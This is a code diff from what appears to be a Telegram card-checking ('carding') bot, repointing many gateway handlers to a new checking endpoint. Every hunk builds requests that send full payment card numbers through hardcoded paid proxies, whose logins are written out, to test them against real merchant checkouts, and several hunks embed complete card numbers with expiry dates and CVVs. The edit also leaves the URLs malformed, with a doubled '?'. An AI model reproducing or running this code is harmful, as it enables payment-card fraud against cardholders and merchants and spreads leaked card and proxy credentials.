@@ -2118,7 +2118,7 @@ async def process_st(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://shopify.stormx.pw/index.php"
+            f"https://rockyog.onrender.com/index.php?"
             f"?site=https://jovs.com"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -2712,7 +2712,7 @@ logger = logging.getLogger(__name__)
 
 import urllib.parse
 
-AUTOSH_BASE = "https://shopify.stormx.pw/index.php"
+AUTOSH_BASE = "https://rockyog.onrender.com/index.php?"
 DEFAULT_PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
 
 async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3047,7 +3047,7 @@ logger = logging.getLogger(__name__)
 # --- HC Processor ---
 import urllib.parse
 
-AUTOSH_BASE = "https://shopify.stormx.pw/index.php"
+AUTOSH_BASE = "https://rockyog.onrender.com/index.php?"
 HC_PROXY = "198.23.239.134:6540:fvbysspi:bsbh3trstb1c"
 
 async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
@@ -3315,7 +3315,7 @@ logger = logging.getLogger(__name__)
 # --- HC Processor ---
 import urllib.parse
 
-AUTOSH_BASE = "https://shopify.stormx.pw/index.php"
+AUTOSH_BASE = "https://rockyog.onrender.com/index.php?"
 ST1_PROXY = "45.38.107.97:6014:fvbysspi:bsbh3trstb1c"
 ST1_SITE = "https://vasileandpavel.com"
 
@@ -3633,7 +3633,7 @@ async def process_oc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://shopify.stormx.pw/index.php"
+            f"https://rockyog.onrender.com/index.php?"
             f"?site=https://arabellahair.com"
             f"&cc={full_card}"
             f"&gateway=ocean"
@@ -3849,7 +3849,7 @@ from bin import get_bin_info
 logger = logging.getLogger(__name__)
 
 # --- Config ---
-AUTOSH_AT_API = "https://shopify.stormx.pw/index.php"
+AUTOSH_AT_API = "https://rockyog.onrender.com/index.php?"
 DEFAULT_PROXY = "64.137.96.74:6641:fvbysspi:bsbh3trstb1c"
 AUTHNET_DEFAULT_SITE = "https://upperlimitsupplements.com"
 
@@ -4126,7 +4126,7 @@ from bin import get_bin_info
 logger = logging.getLogger(__name__)
 
 # --- Config ---
-AUTOSH_AT_API = "https://shopify.stormx.pw/index.php"
+AUTOSH_AT_API = "https://rockyog.onrender.com/index.php?"
 DEFAULT_PROXY = "64.137.96.74:6641:fvbysspi:bsbh3trstb1c"
 AUTHNET_DEFAULT_SITE = "https://store.wikimedia.org"
 
@@ -4403,7 +4403,7 @@ from bin import get_bin_info
 logger = logging.getLogger(__name__)
 
 # --- Config ---
-ADYEN_API = "https://shopify.stormx.pw/index.php"
+ADYEN_API = "https://rockyog.onrender.com/index.php?"
 DEFAULT_PROXY = "154.203.43.247:5536:fvbysspi:bsbh3trstb1c"
 ADYEN_DEFAULT_SITE = "https://pizazzhair.com"
 
@@ -4681,7 +4681,7 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
     """
     # --- API setup ---
     api_url = (
-        "https://shopify.stormx.pw/index.php"
+        "https://rockyog.onrender.com/index.php?"
         f"?site={site_input}"
         f"&cc={cc_input}"
         "&proxy=84.247.60.125:6095:fvbysspi:bsbh3trstb1c"
@@ -4841,7 +4841,7 @@ async def consume_credit(user_id: int) -> bool:
 
 # ===== API template =====
 API_CHECK_TEMPLATE = (
-    "https://shopify.stormx.pw/index.php"
+    "https://rockyog.onrender.com/index.php?"
     "?site={site}"
     "&cc={card}"
     "&proxy=216.10.27.159:6837:fvbysspi:bsbh3trstb1c"
@@ -5082,7 +5082,7 @@ last_site_usage = {}
 
 # ===== Updated API template =====
 API_TEMPLATE = (
-    "https://shopify.stormx.pw/index.php"
+    "https://rockyog.onrender.com/index.php?"
     "?site={site_url}"
     "&cc=4312311807552605|08|2031|631"
     "&proxy=142.111.67.146:5611:fvbysspi:bsbh3trstb1c"
@@ -5228,7 +5228,7 @@ from telegram.error import TelegramError
 from db import get_user, update_user
 
 API_TEMPLATE = (
-    "https://shopify.stormx.pw/index.php"
+    "https://rockyog.onrender.com/index.php?"
     "?site={site_url}&cc=5547300001996183|11|2028|197"
 )
 
@@ -5773,7 +5773,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text("❌ You have no credits left.")
         return
 
-    base_url = user_data.get("base_url", "https://shopify.stormx.pw/index.php")
+    base_url = user_data.get("base_url", "https://rockyog.onrender.com/index.php?")
     sites = user_data.get("custom_urls", [])
     if not sites:
         await update.message.reply_text("❌ No sites found in your account.")
